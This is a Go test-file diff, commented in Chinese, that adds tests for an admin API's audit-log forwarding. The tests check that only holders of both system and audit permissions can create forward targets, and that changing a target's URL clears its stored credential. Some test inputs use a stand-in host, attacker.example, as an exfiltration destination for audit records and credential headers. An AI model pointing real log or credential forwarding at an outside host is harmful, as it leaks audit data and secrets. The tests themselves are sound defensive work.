@@ -413,6 +413,124 @@ func TestAuditForwardRequiresSystemPerm(t *testing.T) {
 	}
 }
 
+// 出口的增删要 system + audit **两权同时持有**。
+//
+// ★这条守的是三权分立里最硬的一条不变量：「只有审计权能读全量审计」。只持 system 的
+// 管理员读不到 GET /api/v1/audit，却能建一个启用中的出口，把此后**每一条**审计
+// （含 seq/mac）实时 POST 到自己的收集器上——不变量被整体绕开。
+func TestAuditForwardWritesRequireSystemAndAudit(t *testing.T) {
+	f := newFwdFixture(t)
+	root := adminToken()
+	// 只持 system 的系统管理员。
+	if code, out := doJSON(t, f.h, "POST", "/api/v1/admins", root, map[string]any{
+		"account": "sys.zhang", "name": "系统管理员张", "roleKey": "system",
+	}); code != http.StatusCreated {
+		t.Fatalf("建系统管理员 http %d: %v", code, out)
+	}
+	sysTok := adminTokenFor("sys.zhang")
+
+	// 读清单：system 一权即可（里面是内网拓扑，不是审计正文）。
+	if code, _ := doJSON(t, f.h, "GET", "/api/v1/audit/forward", sysTok, nil); code != http.StatusOK {
+		t.Fatalf("系统管理员读外送清单应放行，实得 %d", code)
+	}
+	// 建出口：必须 403。
+	if code, out := doJSON(t, f.h, "POST", "/api/v1/audit/forward", sysTok, map[string]any{
+		"name": "我的收集器", "kind": "http", "enabled": true,
+		"config": map[string]any{"url": "https://attacker.example/collect"},
+	}); code != http.StatusForbidden {
+		t.Fatalf("只持 system 建出口应 403（等于开了一条全量审计读通道），实得 %d: %v", code, out)
+	}
+	// 删除同样 403：单方面掐掉外送是同一个不变量的镜像面。
+	id := createSyslogTarget(t, f, root, "SOC syslog", reserveAddr(t), false)
+	if code, _ := doJSON(t, f.h, "DELETE", "/api/v1/audit/forward/"+id, sysTok, nil); code != http.StatusForbidden {
+		t.Fatalf("只持 system 删出口应 403，实得 %d", code)
+	}
+	// 日常运维（凭据 / 自检 / 立即投递）仍只要 system：目的地已由审计权同意过。
+	if code, out := doJSON(t, f.h, "POST", "/api/v1/audit/forward/"+id+"/test", sysTok, nil); code != http.StatusOK {
+		t.Fatalf("只持 system 应能做连通性自检，实得 %d: %v", code, out)
+	}
+
+	// 正解：一个显式含 system+audit 的自定义角色（三权内收缩，不是自造超管）。
+	if code, out := doJSON(t, f.h, "POST", "/api/v1/admin-roles", root, map[string]any{
+		"key": "soc", "name": "SOC 运维", "perms": []string{"system", "audit"},
+	}); code != http.StatusOK {
+		t.Fatalf("建自定义角色 http %d: %v", code, out)
+	}
+	if code, out := doJSON(t, f.h, "POST", "/api/v1/admins", root, map[string]any{
+		"account": "soc.liu", "name": "SOC 刘", "roleKey": "soc",
+	}); code != http.StatusCreated {
+		t.Fatalf("建 SOC 管理员 http %d: %v", code, out)
+	}
+	if code, out := doJSON(t, f.h, "POST", "/api/v1/audit/forward", adminTokenFor("soc.liu"), map[string]any{
+		"name": "SOC HTTP", "kind": "http", "enabled": false,
+		"config": map[string]any{"url": "https://soc.internal/collect"},
+	}); code != http.StatusOK {
+		t.Fatalf("同时持 system+audit 应能建出口，实得 %d: %v", code, out)
+	}
+}
+
+// 改目的地即清凭据：AAD 绑 id 挡的是"密文跨记录剪贴"，挡不住"记录还在原地、URL 被换掉"。
+//
+// ★不改目的地时**一律不动**凭据（改个显示名不该让外送突然认证失败），
+// 两个方向都在这条用例里钉住。
+func TestAuditForwardDestinationChangeClearsSecret(t *testing.T) {
+	f := newFwdFixture(t)
+	tok := adminToken()
+	code, out := doJSON(t, f.h, "POST", "/api/v1/audit/forward", tok, map[string]any{
+		"name": "SOC HTTP", "kind": "http", "enabled": false,
+		"config": map[string]any{"url": "https://soc.internal/collect", "secretHeader": "Authorization"},
+	})
+	if code != http.StatusOK {
+		t.Fatalf("建出口 http %d: %v", code, out)
+	}
+	id := out["target"].(map[string]any)["id"].(string)
+	if code, out := doJSON(t, f.h, "PUT", "/api/v1/audit/forward/"+id+"/secret", tok,
+		map[string]any{"secret": "Bearer 内网收集器令牌"}); code != http.StatusOK {
+		t.Fatalf("设凭据 http %d: %v", code, out)
+	}
+
+	// ① 改显示名 / 启用态：凭据必须还在。
+	code, out = doJSON(t, f.h, "POST", "/api/v1/audit/forward", tok, map[string]any{
+		"id": id, "name": "SOC HTTP（主）", "kind": "http", "enabled": true,
+		"config": map[string]any{"url": "https://soc.internal/collect", "secretHeader": "Authorization"},
+	})
+	if code != http.StatusOK {
+		t.Fatalf("改名 http %d: %v", code, out)
+	}
+	if out["secretCleared"] == true {
+		t.Fatal("只改显示名不该清凭据——那会让外送突然认证失败，且没人知道为什么")
+	}
+	if out["target"].(map[string]any)["hasSecret"] != true {
+		t.Fatalf("改名后凭据应仍在：%v", out["target"])
+	}
+
+	// ② 把 URL 换成别处：凭据必须当场清掉，并如实告诉管理员。
+	code, out = doJSON(t, f.h, "POST", "/api/v1/audit/forward", tok, map[string]any{
+		"id": id, "name": "SOC HTTP（主）", "kind": "http", "enabled": true,
+		"config": map[string]any{"url": "https://attacker.example/collect", "secretHeader": "Authorization"},
+	})
+	if code != http.StatusOK {
+		t.Fatalf("改 URL http %d: %v", code, out)
+	}
+	if out["secretCleared"] != true {
+		t.Fatalf("改了目的地必须清凭据（否则点一次「测试」凭据头就送到对面了）：%v", out)
+	}
+	if out["target"].(map[string]any)["hasSecret"] != false {
+		t.Fatalf("清完之后 hasSecret 应为 false（响应必须反映库里此刻的事实）：%v", out["target"])
+	}
+	if w, _ := out["warning"].(string); !strings.Contains(w, "原凭据已被清除") {
+		t.Fatalf("必须把「凭据已清、需重设」说给管理员看，实得 warning=%q", w)
+	}
+	// 凭据没了，构造出口就该失败（而不是拿空头发出去）。
+	code, out = doJSON(t, f.h, "POST", "/api/v1/audit/forward/"+id+"/test", tok, nil)
+	if code != http.StatusOK || out["ok"] != false {
+		t.Fatalf("凭据被清后自检应如实失败：%d %v", code, out)
+	}
+	if !auditHasEvent(t, f.h, "原有凭据已一并清除") {
+		t.Fatal("凭据被清这件事必须落审计")
+	}
+}
+
 // CSV 导出与外送同源：末尾两列就是链的 seq/mac，导出的那份也能被独立验真。
 func TestAuditExportCarriesChainColumns(t *testing.T) {
 	f := newFwdFixture(t)
